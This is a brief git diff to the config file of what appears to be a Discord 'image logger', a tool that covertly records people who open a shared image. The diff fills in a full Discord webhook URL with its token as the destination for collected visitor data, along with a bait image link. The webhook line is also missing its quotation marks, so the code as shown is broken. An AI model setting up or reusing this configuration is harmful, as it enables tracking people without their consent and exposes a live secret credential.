@@ -13,8 +13,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": https://discord.com/api/webhooks/1390492171613765764/7zb7KhfXj1UzJsYhSLExphiA0UbIL1JlLHHOuehmKZ8RIQ2LCWtm-Mw1TAdac_gbGfVM,
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/28/Bubsy_Mascot.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
